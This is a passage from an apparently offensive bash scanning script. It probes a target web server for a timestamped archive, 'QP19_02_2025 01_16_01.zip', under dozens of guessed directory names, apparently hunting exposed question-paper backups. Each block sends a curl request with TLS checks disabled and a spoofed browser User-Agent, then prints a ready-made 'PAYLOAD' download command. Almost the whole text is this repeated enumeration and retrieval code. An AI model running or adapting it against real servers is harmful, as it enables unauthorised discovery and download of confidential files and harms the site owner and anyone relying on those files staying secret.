echo -n "Payload [QPBulk-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
